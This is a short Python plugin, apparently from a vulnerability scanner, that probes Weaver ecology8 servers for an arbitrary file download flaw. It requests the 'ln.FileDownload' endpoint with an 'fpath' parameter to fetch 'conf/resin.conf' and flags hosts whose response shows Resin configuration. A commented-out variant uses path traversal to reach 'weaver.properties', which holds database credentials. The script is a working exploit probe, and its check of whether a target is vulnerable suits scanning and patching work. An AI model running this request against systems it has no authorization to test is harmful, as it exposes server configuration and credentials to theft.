#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):
    """
    ecology8 download
    """

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB

    async def prove(self):
        if self.base_url:
            async with ClientSession() as session:
                for path in self.get_url_normpath_list(self.url):
                    if path[-1] == '/':
                        # url = path + "weaver/ln.FileDownload?fpath=../ecology/WEB-INF/prop/weaver.properties"
                        url = path + "weaver/ln.FileDownload?fpath=conf/resin.conf"
                        async with session.get(url=url) as res:
                            if res != None:
                                text = await res.text()
                                # if res != None and 'DriverClasses' in res.text:
                                if 'xmlns:resin' in text:
                                    yield url
                                    return